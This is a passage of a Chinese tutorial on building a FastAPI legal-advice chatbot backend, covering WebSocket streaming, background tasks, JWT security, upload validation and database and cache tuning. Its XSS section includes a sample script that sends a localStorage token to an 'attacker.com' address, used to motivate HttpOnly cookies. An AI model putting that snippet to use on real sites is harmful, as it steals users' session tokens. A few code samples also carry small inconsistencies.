    score_a = evaluate(result_a)
    score_b = evaluate(result_b)
    
    winner = "A" if score_a > score_b else "B"
    print(f"\n获胜版本: {winner}")
```

---

## 六、WebSocket 流式响应

### 6.1 WebSocket 原理

#### **HTTP vs WebSocket**

```
HTTP 请求-响应模型：

客户端：发送请求 ──────────────→ 服务器
       等待...
       ←────────────── 返回响应

特点：
✅ 简单
✅ 无状态
❌ 单向通信（客户端主动）
❌ 需要完整响应后才能返回

WebSocket 双向通信：

客户端 ←─────────────────────→ 服务器
       持续连接（长连接）
       任意方向发送消息

特点：
✅ 双向通信
✅ 实时性强
✅ 可以流式传输
❌ 复杂一些
```

#### **WebSocket 握手过程**

```
1. 客户端发起 HTTP 升级请求

GET /api/chat/ws?token=xxx HTTP/1.1
Host: localhost:8000
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13

2. 服务器返回升级确认

HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=

3. 连接建立，开始 WebSocket 通信

客户端 ←─→ 服务器
（使用 WebSocket 帧格式）
```

### 6.2 FastAPI WebSocket 实现

#### **基础 WebSocket 路由**

```python
from fastapi import WebSocket, WebSocketDisconnect

@router.websocket("/chat/ws")
async def websocket_chat(
    websocket: WebSocket,
    token: str = Query(None)
):
    """WebSocket 聊天接口
    
    流程：
    1. 验证 token
    2. 接受连接
    3. 循环接收消息
    4. 流式返回 AI 响应
    5. 异常处理
    """
    
    # === 步骤 1：验证 Token ===
    if not token:
        await websocket.close(code=1008, reason="缺少 token")
        return
    
    try:
        # 解码 token 获取用户信息
        payload = decode_access_token(token)
        username = payload.sub
    except Exception as e:
        await websocket.close(code=1008, reason="无效的 token")
        return
    
    # === 步骤 2：接受连接 ===
    await websocket.accept()
    
    # 创建会话 ID（管理对话历史）
    session_id = uuid4().hex
    CASE_MEMORY_STORE[session_id] = []
    
    logger.info(f"WebSocket 连接建立: user={username}, session={session_id}")
    
    try:
        # === 步骤 3：循环接收消息 ===
        while True:
            # 接收客户端消息（阻塞等待）
            data = await websocket.receive_text()
            logger.info(f"收到消息: {data[:50]}...")
            
            # === 步骤 4：流式返回 AI 响应 ===
            async for chunk in chat_stream(data, session_id):
                await websocket.send_text(chunk)
            
            # 发送结束标记
            await websocket.send_text("[DONE]")
    
    except WebSocketDisconnect:
        logger.info(f"客户端断开连接: session={session_id}")
    
    except Exception as e:
        logger.error(f"WebSocket 错误: {e}", exc_info=True)
        await websocket.send_text(f"[ERROR] {str(e)}")
    
    finally:
        # === 步骤 5：清理资源 ===
        if session_id in CASE_MEMORY_STORE:
            del CASE_MEMORY_STORE[session_id]
        await websocket.close()
```

#### **流式 AI 响应实现**

```python
async def chat_stream(query: str, session_id: str, user_id: str, dept_id: str):
    """流式 AI 聊天
    
    关键：使用 AsyncGenerator 实现流式输出
    """
    
    # === 步骤 1：RAG 检索 ===
    chain = RagChainFactory().create_chain()
    chunks = await chain.retriever.retrieve(
        query=query,
        user_id=str(user_id),
        dept_id=str(dept_id),
        session_id=session_id,
    )
    
    context = "\n\n".join([
        f"【{chunk.metadata.get('source', '知识库')}】\n{chunk.content}"
        for chunk in chunks
    ])
    
    # === 步骤 2：构建对话历史 ===
    history = CASE_MEMORY_STORE.get(session_id, [])
    
    messages = [
        SystemMessage(content=LEGAL_CONSULTANT_SYSTEM_PROMPT),
        SystemMessage(content=f"相关法律依据：\n{context}")
    ]
    
    # 添加历史消息（最多保留 10 轮）
    messages.extend(history[-20:])
    
    # 添加当前问题
    messages.append(HumanMessage(content=query))
    
    # === 步骤 3：流式调用 LLM ===
    llm = ChatOpenAI(
        model=settings.OPENAI_MODEL,
        temperature=0.7,
        streaming=True  # ← 关键：启用流式
    )
    
    # 使用 astream 而不是 ainvoke
    full_response = ""
    async for chunk in llm.astream(messages):
        if chunk.content:
            full_response += chunk.content
            yield chunk.content  # ← 关键：逐块返回
    
    # === 步骤 4：保存对话历史 ===
    history.append(HumanMessage(content=query))
    history.append(AIMessage(content=full_response))
    CASE_MEMORY_STORE[session_id] = history
```

**关键点讲解**：

```python
# 1. streaming=True 是必须的
llm = ChatOpenAI(streaming=True)  # ✅
llm = ChatOpenAI(streaming=False) # ❌ 等待完整响应

# 2. 使用 astream 而不是 ainvoke
async for chunk in llm.astream(messages):  # ✅ 流式
    yield chunk.content

response = await llm.ainvoke(messages)     # ❌ 一次性返回

# 3. AsyncGenerator 的使用
async def stream_func():
    for i in range(10):
        yield f"chunk_{i}"  # 每次返回一块

# 调用
async for chunk in stream_func():
    print(chunk)  # 逐块接收

# 4. WebSocket send_text 是异步的
await websocket.send_text(chunk)  # ✅
websocket.send_text(chunk)        # ❌ 错误
```

### 6.3 客户端实现

#### **JavaScript WebSocket 客户端**

```javascript
// 建立连接
const token = localStorage.getItem('token');
const ws = new WebSocket(`ws://localhost:8000/api/chat/ws?token=${token}`);

// 连接打开
ws.onopen = () => {
    console.log('WebSocket 连接成功');
};

// 接收消息
ws.onmessage = (event) => {
    const chunk = event.data;
    
    if (chunk === '[DONE]') {
        console.log('AI 响应完成');
        return;
    }
    
    if (chunk.startsWith('[ERROR]')) {
        console.error('错误:', chunk);
        return;
    }
    
    // 逐字显示
    appendToMessageBox(chunk);
};

// 错误处理
ws.onerror = (error) => {
    console.error('WebSocket 错误:', error);
};

// 连接关闭
ws.onclose = (event) => {
    console.log('WebSocket 连接关闭:', event.code, event.reason);
};

// 发送消息
function sendMessage(message) {
    if (ws.readyState === WebSocket.OPEN) {
        ws.send(message);
    } else {
        console.error('WebSocket 未连接');
    }
}

// 逐字显示效果
let messageElement = null;

function appendToMessageBox(chunk) {
    if (!messageElement) {
        // 创建新消息元素
        messageElement = document.createElement('div');
        messageElement.className = 'message ai-message';
        document.getElementById('chatBox').appendChild(messageElement);
    }
    
    // 追加文字
    messageElement.textContent += chunk;
    
    // 滚动到底部
    messageElement.scrollIntoView({ behavior: 'smooth' });
}
```

### 6.4 常见问题处理

#### **问题1：WebSocket 连接超时**

```python
# 原因：长时间无数据传输，连接被中断

# 解决方案：心跳机制
import asyncio

@router.websocket("/chat/ws")
async def websocket_chat(websocket: WebSocket):
    await websocket.accept()
    
    # 启动心跳任务
    async def heartbeat():
        while True:
            try:
                await websocket.send_text("[PING]")
                await asyncio.sleep(30)  # 每30秒发送一次
            except:
                break
    
    heartbeat_task = asyncio.create_task(heartbeat())
    
    try:
        # 正常业务逻辑
        while True:
            data = await websocket.receive_text()
            # ...
    finally:
        heartbeat_task.cancel()
```

#### **问题2：对话历史管理**

```python
# 问题：对话历史越来越长，超过上下文窗口

# 解决方案1：限制历史轮数
MAX_HISTORY_TURNS = 10

history = CASE_MEMORY_STORE.get(session_id, [])
messages.extend(history[-(MAX_HISTORY_TURNS * 2):])  # 最多保留10轮

# 解决方案2：智能摘要
async def summarize_history(history):
    """当历史太长时，用 AI 生成摘要"""
    if len(history) > 20:
        # 提取前面的对话
        old_messages = history[:-10]
        
        # 调用 AI 生成摘要
        summary_prompt = f"""
        总结以下对话的核心内容：
        {format_messages(old_messages)}
        
        用2-3句话概括。
        """
        summary = await llm.ainvoke([HumanMessage(content=summary_prompt)])
        
        # 用摘要替换旧消息
        return [
            SystemMessage(content=f"之前对话摘要：{summary.content}"),
            *history[-10:]
        ]
    return history

# 解决方案3：向量存储历史（高级）
# 把历史对话向量化，检索相关对话
```

---

## 七、异步任务处理

### 7.1 为什么需要异步任务？

```
场景对比：

【同步处理】
用户上传证据 PDF
  ↓
解析 PDF 文本（2秒）
  ↓
调用 AI 分析（5秒）
  ↓
保存结果（0.5秒）
  ↓
返回响应（总耗时 7.5 秒）

问题：
❌ 用户等待时间长
❌ HTTP 请求可能超时
❌ 用户体验差

【异步处理】
用户上传证据 PDF
  ↓
保存文件，返回响应（0.5秒）✅
  ↓
后台任务：
  - 解析 PDF
  - AI 分析
  - 保存结果
  ↓
用户可以查询状态

优势：
✅ 立即返回（0.5秒）
✅ 不会超时
✅ 用户体验好
```

### 7.2 FastAPI BackgroundTasks

#### **基本用法**

```python
from fastapi import BackgroundTasks

# 定义后台任务函数
def process_data(data_id: str, user_id: int):
    """后台处理数据"""
    logger.info(f"开始处理: {data_id}")
    # 耗时操作
    time.sleep(5)
    logger.info(f"处理完成: {data_id}")

# 在路由中使用
@app.post("/upload")
async def upload_file(
    file: UploadFile,
    background_tasks: BackgroundTasks
):
    # 保存文件（快速）
    file_id = save_file(file)
    
    # 添加后台任务
    background_tasks.add_task(process_data, file_id, user_id=1)
    
    # 立即返回
    return {"file_id": file_id, "status": "processing"}
```

#### **重要注意事项**

```python
# ⚠️ 问题1：数据库会话失效

# 错误示例
@app.post("/upload")
async def upload(file: UploadFile, db: Session, background_tasks: BackgroundTasks):
    # 创建记录
    record = Evidence(...)
    db.add(record)
    db.commit()
    
    # 添加后台任务（❌ 错误）
    background_tasks.add_task(process_evidence, db, record.id)
    return {"id": record.id}

# 问题：响应返回后，db 会话被关闭，后台任务中使用会报错

# 正确做法：在后台任务中创建新会话
def process_evidence(evidence_id: str):
    # 创建新的数据库会话
    with Session(engine) as db:
        evidence = db.exec(
            select(Evidence).where(Evidence.evidence_id == evidence_id)
        ).first()
        
        if not evidence:
            return
        
        # 处理逻辑
        evidence.status = "processing"
        db.commit()
        
        # AI 分析...
        
        evidence.status = "completed"
        db.commit()

# ⚠️ 问题2：异常处理

# 后台任务的异常不会返回给客户端
# 必须在任务内部捕获并记录

def process_evidence(evidence_id: str):
    try:
        # 处理逻辑
        pass
    except Exception as e:
        logger.error(f"后台任务失败: {evidence_id}, {e}", exc_info=True)
        
        # 更新数据库状态
        with Session(engine) as db:
            evidence = db.get(Evidence, evidence_id)
            if evidence:
                evidence.status = "failed"
                evidence.error_message = str(e)
                db.commit()

# ⚠️ 问题3：长时间任务

# BackgroundTasks 适合短任务（< 1分钟）
# 长任务（> 5分钟）建议使用 Celery

from celery import Celery

celery_app = Celery('tasks', broker='redis://localhost:6379')

@celery_app.task
def long_running_task(data):
    # 长时间处理
    pass

# 在 FastAPI 中调用
@app.post("/upload")
async def upload(file: UploadFile):
    file_id = save_file(file)
    
    # 发送到 Celery 队列
    long_running_task.delay(file_id)
    
    return {"file_id": file_id}
```

### 7.3 任务状态管理

```python
# 设计任务状态机

class TaskStatus:
    PENDING = "pending"       # 待处理
    PROCESSING = "processing" # 处理中
    COMPLETED = "completed"   # 完成
    FAILED = "failed"         # 失败

# 状态转换
状态转换图：
pending → processing → completed
              ↓
            failed

# 实现状态查询接口
@router.get("/evidences/{evidence_id}/status")
async def get_evidence_status(
    evidence_id: str,
    db: Session = Depends(get_db)
):
    """查询证据处理状态"""
    evidence = db.exec(
        select(Evidence).where(Evidence.evidence_id == evidence_id)
    ).first()
    
    if not evidence:
        raise HTTPException(404, "证据不存在")
    
    return {
        "evidence_id": evidence_id,
        "status": evidence.status,
        "progress": calculate_progress(evidence),
        "result": evidence.analysis_result if evidence.status == "completed" else None,
        "error": evidence.error_message if evidence.status == "failed" else None
    }

# 前端轮询查询状态
async function uploadAndWaitResult(file) {
    // 1. 上传文件
    const { evidence_id } = await uploadFile(file);
    
    // 2. 轮询查询状态
    while (true) {
        const status = await getEvidenceStatus(evidence_id);
        
        if (status.status === 'completed') {
            return status.result;
        }
        
        if (status.status === 'failed') {
            throw new Error(status.error);
        }
        
        // 等待 2 秒后再查询
        await sleep(2000);
    }
}
```

---

## 八、JWT 身份认证

### 8.1 JWT 核心原理

#### **JWT 结构详解**

```
JWT 由三部分组成，用 . 分隔：

Header.Payload.Signature

【Header（头部）】
{
  "alg": "HS256",  // 签名算法
  "typ": "JWT"     // 类型
}
↓ Base64URL 编码
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9

【Payload（负载）】
{
  "sub": "admin",           // 主体（用户名）
  "exp": 1700000000,        // 过期时间（Unix 时间戳）
  "iat": 1700000000 - 1800  // 签发时间
}
↓ Base64URL 编码
eyJzdWIiOiJhZG1pbiIsImV4cCI6MTcwMDAwMDAwMH0

【Signature（签名）】
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret_key
)
↓
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

完整 JWT：
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImV4cCI6MTcwMDAwMDAwMH0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

#### **签名验证原理**

```python
# 为什么需要签名？
# 防止 Token 被篡改

# 攻击场景（无签名）：
原始 Token：
eyJzdWIiOiJ1c2VyIn0  # {"sub": "user"}

攻击者修改：
eyJzdWIiOiJhZG1pbiJ9  # {"sub": "admin"}  ← 伪造管理员

服务器无法识别被篡改 ❌

# 防御（有签名）：
原始 Token：
eyJzdWIiOiJ1c2VyIn0.validSignature123

攻击者修改 Payload：
eyJzdWIiOiJhZG1pbiJ9.validSignature123

服务器验证：
1. 用相同算法和密钥重新计算签名
2. HMAC-SHA256("eyJzdWIiOiJhZG1pbiJ9", secret) = newSignature456
3. 对比 validSignature123 != newSignature456
4. 验证失败，拒绝请求 ✅

结论：
- 没有 secret_key，无法伪造有效签名
- secret_key 必须保密
```

### 8.2 安全最佳实践

#### **SECRET_KEY 管理**

```python
# ❌ 错误做法
SECRET_KEY = "123456"  # 太简单
SECRET_KEY = "my-secret-key"  # 可预测

# ✅ 正确做法
import secrets

# 生成强随机密钥
SECRET_KEY = secrets.token_urlsafe(32)
# 输出：xKj9mP2nQ5rS8tU1vW4xY7zA0bC3dE6fG9hI2jK5lM8n

# 存储在环境变量
# .env
SECRET_KEY=xKj9mP2nQ5rS8tU1vW4xY7zA0bC3dE6fG9hI2jK5lM8n

# 读取
from pydantic_settings import BaseSettings

class Settings(BaseSettings):
    SECRET_KEY: str
    
    class Config:
        env_file = ".env"

settings = Settings()

# ⚠️ 安全建议
1. 每个环境不同的密钥（开发、测试、生产）
2. 定期轮换密钥（每 6-12 个月）
3. 不要提交到 Git（.gitignore 忽略 .env）
4. 生产环境使用密钥管理服务（AWS Secrets Manager、Azure Key Vault）
```

#### **Token 过期时间设置**

```python
# 根据场景设置合适的过期时间

# 场景 1：移动 App（长过期时间）
ACCESS_TOKEN_EXPIRE_MINUTES = 60 * 24 * 30  # 30 天
# 理由：用户不想频繁登录

# 场景 2：Web 应用（中等过期时间）
ACCESS_TOKEN_EXPIRE_MINUTES = 30  # 30 分钟
REFRESH_TOKEN_EXPIRE_DAYS = 7     # 刷新令牌 7 天
# 理由：平衡安全性和用户体验

# 场景 3：高安全性应用（短过期时间）
ACCESS_TOKEN_EXPIRE_MINUTES = 15  # 15 分钟
# 理由：银行、金融类应用

# 实现刷新令牌机制
@router.post("/refresh")
async def refresh_token(refresh_token: str):
    """刷新访问令牌"""
    try:
        # 验证刷新令牌
        payload = decode_refresh_token(refresh_token)
        
        # 生成新的访问令牌
        new_access_token = create_access_token(
            JWTPayloadSchema(sub=payload.sub)
        )
        
        return {"access_token": new_access_token}
    except:
        raise HTTPException(401, "刷新令牌无效或已过期")
```

#### **防止 XSS 和 CSRF**

```python
# XSS（跨站脚本攻击）防护

# ❌ 错误：存储在 localStorage
// JavaScript
localStorage.setItem('token', token);
// 问题：XSS 攻击可以读取

// 攻击代码
<script>
  fetch('https://attacker.com/steal?token=' + localStorage.getItem('token'));
</script>

# ✅ 正确：使用 HttpOnly Cookie
from fastapi import Response

@router.post("/login")
async def login(response: Response):
    token = create_access_token(...)
    
    # 设置 HttpOnly Cookie
    response.set_cookie(
        key="access_token",
        value=token,
        httponly=True,     # JavaScript 无法读取
        secure=True,       # 仅 HTTPS
        samesite="lax",    # CSRF 防护
        max_age=1800       # 30 分钟
    )
    
    return {"message": "登录成功"}

# CSRF（跨站请求伪造）防护

# 方案 1：Double Submit Cookie
# 1. Token 存在 Cookie 中
# 2. 同时在 Header 中发送 Token
# 3. 服务器对比两者是否一致

# 方案 2：SameSite Cookie
response.set_cookie(
    key="access_token",
    value=token,
    samesite="strict"  # 禁止跨站请求携带 Cookie
)
```

---

## 九、文件上传与解析

### 9.1 文件上传安全性

#### **文件类型验证**

```python
# 三层验证机制

# 第 1 层：MIME 类型检查（客户端可伪造）
ALLOWED_MIME_TYPES = [
    "application/pdf",
    "image/jpeg",
    "image/png",
    "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
]

if file.content_type not in ALLOWED_MIME_TYPES:
    raise HTTPException(400, "不支持的文件类型")

# 第 2 层：文件扩展名检查
allowed_extensions = {'.pdf', '.jpg', '.png', '.xlsx'}
file_ext = Path(file.filename).suffix.lower()

if file_ext not in allowed_extensions:
    raise HTTPException(400, f"不允许的文件扩展名: {file_ext}")

# 第 3 层：文件头（Magic Number）检查（最可靠）
import magic

contents = await file.read()
detected_mime = magic.from_buffer(contents, mime=True)

MIME_TO_MAGIC = {
    "application/pdf": "application/pdf",
    "image/jpeg": "image/jpeg",
    "image/png": "image/png"
}

expected_mime = MIME_TO_MAGIC.get(file.content_type)
if detected_mime != expected_mime:
    raise HTTPException(400, f"文件内容与声明类型不符")

await file.seek(0)  # 重置文件指针
```

#### **文件大小限制**

```python
# 方式 1：在应用代码中检查
MAX_FILE_SIZE = 10 * 1024 * 1024  # 10MB

contents = await file.read()
if len(contents) > MAX_FILE_SIZE:
    raise HTTPException(413, "文件大小超过 10MB")

# 方式 2：FastAPI 中间件
from starlette.middleware.base import BaseHTTPMiddleware

class LimitUploadSize(BaseHTTPMiddleware):
    def __init__(self, app, max_upload_size: int):
        super().__init__(app)
        self.max_upload_size = max_upload_size
    
    async def dispatch(self, request, call_next):
        if request.method == "POST":
            content_length = request.headers.get("content-length")
            if content_length and int(content_length) > self.max_upload_size:
                return JSONResponse(
                    status_code=413,
                    content={"detail": "文件太大"}
                )
        return await call_next(request)

# 添加中间件
app.add_middleware(LimitUploadSize, max_upload_size=10*1024*1024)

# 方式 3：Nginx 限制（推荐，生产环境）
# nginx.conf
client_max_body_size 10m;
```

### 9.2 文件解析技术

#### **PDF 解析对比**

```python
# 方案 1：pypdfium2（推荐）
import pypdfium2 as pdfium

def extract_pdf_pypdfium(file_path):
    pdf = pdfium.PdfDocument(str(file_path))
    text = []
    
    for page in pdf:
        textpage = page.get_textpage()
        text.append(textpage.get_text_range())
        textpage.close()
        page.close()
    
    pdf.close()
    return "\n\n".join(text)

# 优点：
# ✅ 基于 Google PDFium（Chrome PDF 引擎）
# ✅ 支持复杂 PDF
# ✅ 性能好

# 方案 2：PyPDF2（纯 Python，简单但功能弱）
from PyPDF2 import PdfReader

def extract_pdf_pypdf2(file_path):
    reader = PdfReader(file_path)
    text = []
    for page in reader.pages:
        text.append(page.extract_text())
    return "\n\n".join(text)

# 缺点：
# ❌ 对复杂 PDF 支持差
# ❌ 扫描件无法识别

# 方案 3：OCR（扫描件）
from PIL import Image
import pytesseract
import pdf2image

def extract_pdf_ocr(file_path):
    # 转为图片
    images = pdf2image.convert_from_path(file_path)
    
    text = []
    for img in images:
        # OCR 识别
        page_text = pytesseract.image_to_string(img, lang='chi_sim')
        text.append(page_text)
    
    return "\n\n".join(text)

# 适用：扫描件 PDF
# 缺点：速度慢、准确率依赖图片质量
```

#### **Excel 解析**

```python
import openpyxl
from openpyxl.utils import get_column_letter

def extract_excel(file_path):
    """解析 Excel 文件
    
    难点：
    1. 多个工作表
    2. 合并单元格
    3. 公式单元格
    4. 格式化数字（日期、货币）
    """
    
    wb = openpyxl.load_workbook(file_path, data_only=True)
    result = []
    
    for sheet_name in wb.sheetnames:
        sheet = wb[sheet_name]
        result.append(f"===== 工作表: {sheet_name} =====\n")
        
        # 遍历行
        for row in sheet.iter_rows(values_only=True):
            # 处理空行
            if all(cell is None for cell in row):
                continue
            
            # 转为字符串
            row_str = "\t".join([
                str(cell) if cell is not None else ""
                for cell in row
            ])
            result.append(row_str)
        
        result.append("\n")
    
    wb.close()
    return "\n".join(result)

# 高级：识别工资流水表结构
def parse_salary_table(file_path):
    """智能解析工资流水表"""
    wb = openpyxl.load_workbook(file_path)
    sheet = wb.active
    
    # 1. 查找表头
    header_row = None
    for row in sheet.iter_rows(min_row=1, max_row=10):
        row_values = [cell.value for cell in row if cell.value]
        # 包含"日期"、"基本工资"等关键词
        if any(kw in str(row_values) for kw in ["日期", "工资", "金额"]):
            header_row = row[0].row
            break
    
    if not header_row:
        raise Exception("未找到表头")
    
    # 2. 提取数据
    headers = [cell.value for cell in sheet[header_row]]
    data = []
    
    for row in sheet.iter_rows(min_row=header_row + 1):
        row_dict = {}
        for i, cell in enumerate(row):
            if i < len(headers) and headers[i]:
                row_dict[headers[i]] = cell.value
        if row_dict:
            data.append(row_dict)
    
    wb.close()
    return data

# 使用
salary_data = parse_salary_table("工资流水.xlsx")
# [
#   {"日期": "2024-01", "基本工资": 8000, "绩效": 2000, ...},
#   {"日期": "2024-02", "基本工资": 8000, "绩效": 1500, ...}
# ]
```

---

## 十、性能优化策略

### 10.1 数据库优化

#### **连接池配置**

```python
from sqlalchemy import create_engine

# 默认配置（性能一般）
engine = create_engine(DATABASE_URL)

# 优化配置
engine = create_engine(
    DATABASE_URL,
    pool_size=10,          # 连接池大小（默认 5）
    max_overflow=20,       # 最大溢出连接（默认 10）
    pool_pre_ping=True,    # 连接前检查有效性
    pool_recycle=3600,     # 每小时回收连接（防止 MySQL gone away）
    echo=False,            # 生产环境关闭 SQL 日志
    pool_timeout=30        # 获取连接超时时间
)

# 参数说明：
pool_size = 10
# 常驻连接数
# 建议：预期并发数 / 2

max_overflow = 20
# 最大额外连接数
# 总连接数 = pool_size + max_overflow = 30

pool_recycle = 3600
# 连接回收时间（秒）
# MySQL 默认 8 小时超时，建议 1-2 小时回收
```

#### **查询优化**

```python
# 优化 1：使用索引
from sqlmodel import Field

class Evidence(SQLModel, table=True):
    id: int = Field(primary_key=True)
    user_id: int = Field(index=True)  # ← 添加索引
    evidence_id: str = Field(unique=True, index=True)
    status: str = Field(index=True)
    created_at: datetime = Field(index=True)

# 查询时自动使用索引
evidences = db.exec(
    select(Evidence)
    .where(Evidence.user_id == user_id)  # 使用 user_id 索引
    .where(Evidence.status == "completed")  # 使用 status 索引
).all()

# 优化 2：分页查询
from fastapi import Query

@router.get("/evidences")
async def list_evidences(
    page: int = Query(1, ge=1),
    page_size: int = Query(20, ge=1, le=100),
    db: Session = Depends(get_db)
):
    # 计算偏移量
    offset = (page - 1) * page_size
    
    # 分页查询
    evidences = db.exec(
        select(Evidence)
        .offset(offset)
        .limit(page_size)
    ).all()
    
    # 总数（可选，缓存）
    total = db.exec(
        select(func.count()).select_from(Evidence)
    ).one()
    
    return {
        "items": evidences,
        "total": total,
        "page": page,
        "page_size": page_size
    }

# 优化 3：N+1 查询问题
# ❌ 错误（N+1 查询）
users = db.exec(select(User)).all()
for user in users:
    # 每个用户查询一次证据（N 次查询）
    evidences = db.exec(
        select(Evidence).where(Evidence.user_id == user.id)
    ).all()

# ✅ 正确（JOIN 查询）
from sqlalchemy.orm import selectinload

users = db.exec(
    select(User)
    .options(selectinload(User.evidences))  # 预加载证据
).all()

for user in users:
    evidences = user.evidences  # 不再查询数据库
```

### 10.2 缓存策略

```python
# Redis 缓存

import redis
import json
from functools import wraps

redis_client = redis.Redis(host='localhost', port=6379, decode_responses=True)

def cache_result(expire=300):
    """缓存装饰器"""
    def decorator(func):
        @wraps(func)
        async def wrapper(*args, **kwargs):
            # 生成缓存 key
            cache_key = f"{func.__name__}:{str(args)}:{str(kwargs)}"
            
            # 尝试从缓存获取
            cached = redis_client.get(cache_key)
            if cached:
                return json.loads(cached)
            
            # 调用函数
            result = await func(*args, **kwargs)
            
            # 存入缓存
            redis_client.setex(
                cache_key,
                expire,
                json.dumps(result, ensure_ascii=False)
            )
            
            return result
        return wrapper
    return decorator

# 使用
@cache_result(expire=600)  # 缓存 10 分钟
async def get_legal_articles(keyword: str):
    """查询法律条文（重复查询多）"""
    retriever = ChromaKnowledgeRetriever()
    results = await retriever.retrieve(
        query=keyword,
        user_id="system",
        dept_id="system",
        session_id=None,
    )
    return [{"content": r.content, "metadata": r.metadata} for r in results]

# 缓存失效
def invalidate_cache(func_name: str, *args, **kwargs):
    """手动使缓存失效"""
    cache_key = f"{func_name}:{str(args)}:{str(kwargs)}"
    redis_client.delete(cache_key)
```

### 10.3 响应压缩

```python
from fastapi.middleware.gzip import GZipMiddleware

# 添加 Gzip 压缩中间件
app.add_middleware(
    GZipMiddleware,
    minimum_size=1000  # 超过 1KB 才压缩
)

# 效果对比：
原始 JSON 响应：50 KB
Gzip 压缩后：8 KB
节省：84% 带宽

# 适用场景：
✅ JSON API 响应
✅ HTML 页面
✅ 文本文件
❌ 图片（已压缩）
❌ 视频（已压缩）
```

---

## 总结：技术难点清单

### 核心难点及解决方案

| 技术点 | 难点 | 解决方案 |
|--------|------|----------|
| **RAG 检索** | 单一检索不准确 | 检索边界（向量+BM25）+ 结果排序 |
| **文本切片** | 切片大小难以平衡 | 700字+120字重叠，保持语义完整 |
| **向量化** | API 调用慢 | 批量处理（8条/批）+ 本地缓存 |
| **提示词** | AI 输出不稳定 | 强约束 + Few-shot + 结构化输出 |
| **WebSocket** | 连接超时 | 心跳机制 + 状态管理 |
| **异步任务** | 数据库会话失效 | 任务内创建新会话 |
| **JWT 认证** | Token 泄露风险 | HttpOnly Cookie + 短过期时间 |
| **文件解析** | 格式多样 | 多库支持（PDF/Excel/OCR）|
| **性能优化** | 数据库慢查询 | 索引 + 连接池 + 缓存 |

### 讲解要点提示

1. **演示时强调原理**：不仅展示代码，更要解释"为什么这样设计"
2. **对比方案**：说明为什么选择这个方案而不是另一个
3. **实际效果**：展示优化前后的性能对比数据
4. **踩坑经验**：分享开发中遇到的问题和解决过程
5. **生产经验**：说明哪些是开发环境够用，哪些必须在生产环境优化

---

**文档完成！** 这份技术细节讲解文档涵盖了项目的所有核心技术点，适合在 AI 生成项目时进行专业讲解。
